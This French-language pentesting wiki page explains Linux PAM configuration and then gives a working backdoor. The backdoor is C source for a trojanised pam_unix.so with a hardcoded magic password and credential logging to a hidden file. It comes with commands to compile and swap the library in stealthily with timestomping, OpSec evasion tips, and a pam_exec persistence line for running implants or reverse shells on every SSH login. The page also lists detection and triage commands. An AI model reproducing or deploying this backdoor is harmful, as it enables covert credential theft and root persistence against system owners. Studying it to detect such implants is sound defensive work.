# PAM - Pluggable Authentication Modules

{{#include ../../banners/hacktricks-training.md}}

### Informations de base

**PAM (Pluggable Authentication Modules)** agit comme un mécanisme de sécurité qui **vérifie l'identité des utilisateurs tentant d'accéder aux services informatiques**, contrôlant leur accès en fonction de divers critères. C'est l'équivalent d'un portier numérique, garantissant que seuls les utilisateurs autorisés peuvent accéder à des services spécifiques tout en pouvant limiter leur utilisation pour éviter la surcharge du système.

#### Fichiers de configuration

- **Solaris et les systèmes basés sur UNIX** utilisent généralement un fichier de configuration central situé à `/etc/pam.conf`.
- **Les systèmes Linux** préfèrent une approche par répertoire, stockant les configurations spécifiques aux services dans `/etc/pam.d`. Par exemple, le fichier de configuration pour le service login se trouve à `/etc/pam.d/login`.

Un exemple de configuration PAM pour le service login pourrait ressembler à ceci:
```
auth required /lib/security/pam_securetty.so
auth required /lib/security/pam_nologin.so
auth sufficient /lib/security/pam_ldap.so
auth required /lib/security/pam_unix_auth.so try_first_pass
account sufficient /lib/security/pam_ldap.so
account required /lib/security/pam_unix_acct.so
password required /lib/security/pam_cracklib.so
password required /lib/security/pam_ldap.so
password required /lib/security/pam_pwdb.so use_first_pass
session required /lib/security/pam_unix_session.so
```
#### **PAM Management Realms**

Ces domaines, ou groupes de gestion, incluent **auth**, **account**, **password**, et **session**, chacun responsable de différents aspects du processus d'authentification et de gestion de session :

- **Auth**: Valide l'identité de l'utilisateur, souvent en demandant un mot de passe.
- **Account**: Gère la vérification du compte, en vérifiant des conditions comme l'appartenance à un groupe ou des restrictions horaires.
- **Password**: Gère les mises à jour de mot de passe, y compris les vérifications de complexité ou la prévention des attaques par dictionnaire.
- **Session**: Gère les actions au début ou à la fin d'une session de service, comme le montage de répertoires ou la définition de limites de ressources.

#### **PAM Module Controls**

Les contrôles dictent la réponse du module en cas de succès ou d'échec, influençant le processus d'authentification global. Ceux-ci incluent :

- **Required**: L'échec d'un module required entraîne un échec final, mais seulement après que tous les modules suivants aient été vérifiés.
- **Requisite**: Arrêt immédiat du processus en cas d'échec.
- **Sufficient**: Le succès contourne le reste des vérifications du même domaine à moins qu'un module ultérieur n'échoue.
- **Optional**: Ne provoque un échec que s'il est le seul module dans la pile.

#### Example Scenario

Dans une configuration avec plusieurs modules auth, le processus suit un ordre strict. Si le `pam_securetty` module constate que le terminal de connexion n'est pas autorisé, les connexions root sont bloquées, mais tous les modules sont néanmoins traités en raison de son statut "required". Le `pam_env` définit des variables d'environnement, améliorant potentiellement l'expérience utilisateur. Les modules `pam_ldap` et `pam_unix` travaillent ensemble pour authentifier l'utilisateur, `pam_unix` tentant d'utiliser un mot de passe fourni précédemment, ce qui améliore l'efficacité et la flexibilité des méthodes d'authentification.


## Backdooring PAM – Hooking `pam_unix.so`

A classic persistence trick in high-value Linux environments is to **remplacer la bibliothèque PAM légitime par un trojanised drop-in**.  Parce que chaque connexion SSH / console appelle `pam_unix.so:pam_sm_authenticate()`, quelques lignes de C suffisent pour capturer des identifiants ou implémenter un contournement de mot de passe *magique*.

### Compilation Cheatsheet
<details>
<summary>Exemple de `pam_unix.so` trojan</summary>
```c
#define _GNU_SOURCE
#include <security/pam_modules.h>
#include <dlfcn.h>
#include <stdio.h>
#include <fcntl.h>
#include <unistd.h>

static int (*orig)(pam_handle_t *, int, int, const char **);
static const char *MAGIC = "Sup3rS3cret!";

int pam_sm_authenticate(pam_handle_t *pamh, int flags, int argc, const char **argv) {
const char *user, *pass;
pam_get_user(pamh, &user, NULL);
pam_get_authtok(pamh, PAM_AUTHTOK, &pass, NULL);

/* Magic pwd → immediate success */
if(pass && strcmp(pass, MAGIC) == 0) return PAM_SUCCESS;

/* Credential harvesting */
int fd = open("/usr/bin/.dbus.log", O_WRONLY|O_APPEND|O_CREAT, 0600);
dprintf(fd, "%s:%s\n", user, pass);
close(fd);

/* Fall back to original function */
if(!orig) {
orig = dlsym(RTLD_NEXT, "pam_sm_authenticate");
}
return orig(pamh, flags, argc, argv);
}
```
</details>

Compiler et remplacer furtivement :
```bash
gcc -fPIC -shared -o pam_unix.so trojan_pam.c -ldl -lpam
mv /lib/security/pam_unix.so /lib/security/pam_unix.so.bak
mv pam_unix.so /lib/security/pam_unix.so
chmod 644 /lib/security/pam_unix.so     # keep original perms
touch -r /bin/ls /lib/security/pam_unix.so  # timestomp
```
### Conseils OpSec
1. **Atomic overwrite** – écrire dans un fichier temporaire et `mv` en place pour éviter des bibliothèques partiellement écrites qui verrouilleraient l'accès SSH.
2. Le placement de fichiers de log comme `/usr/bin/.dbus.log` se fond avec des artefacts de bureau légitimes.
3. Garder les exports de symboles identiques (`pam_sm_setcred`, etc.) pour éviter un mauvais comportement de PAM.

### Détection
* Comparer les MD5/SHA256 de `pam_unix.so` avec le paquet de la distro.
* `rpm -V pam` or `debsums -s libpam-modules` pour détecter des bibliothèques remplacées sans hachage manuel.
* Vérifier la présence de fichiers world-writable ou d'une propriété inhabituelle sous `/lib/security/`.
* Règle `auditd` : `-w /lib/security/pam_unix.so -p wa -k pam-backdoor`.
* Grep les configs PAM pour des modules inattendus : `grep -R "pam_[a-z].*\.so" /etc/pam.d/ | grep -v pam_unix`.

### Commandes de triage rapide (post-compromise or threat hunting)
```bash
# 1) Spot alien PAM objects
find /{lib,usr/lib,usr/local/lib}{,64}/security -type f -printf '%p %s %M %u:%g %TY-%Tm-%Td\n' | grep -E 'pam_|libselinux'

# 2) Verify package integrity
command -v rpm >/dev/null && rpm -V pam || debsums -s libpam-modules

# 3) Identify non-packaged PAM modules
for f in /{lib,usr/lib,usr/local/lib}{,64}/security/*.so; do
dpkg -S "$f" >/dev/null 2>&1 || echo "UNPACKAGED: $f";
done

# 4) Look for stealth config edits
grep -R "pam_.*\.so" /etc/pam.d/ | grep -E 'plg|selinux|custom|exec'
```
### Abuser de `pam_exec` pour la persistance
Au lieu de remplacer `pam_unix.so`, une approche plus discrète consiste à ajouter une ligne `pam_exec` dans `/etc/pam.d/sshd` afin que chaque connexion SSH lance un implant tout en laissant la pile normale intacte :
```bash
# Prepend to /etc/pam.d/sshd
session optional pam_exec.so quiet /usr/local/bin/.ssh_hook.sh
```
`pam_exec` s'exécute en root dans le contexte PAM de sshd, donc le script peut lancer des reverse shells, collecter des env vars, ou rouvrir des implanted sockets sans modifier le filesystem ni les core libraries.


## References

- [https://hotpotato.tistory.com/434](https://hotpotato.tistory.com/434)
- [Palo Alto Unit42 – Infiltration of Global Telecom Networks](https://unit42.paloaltonetworks.com/infiltration-of-global-telecom-networks/)

{{#include ../../banners/hacktricks-training.md}}
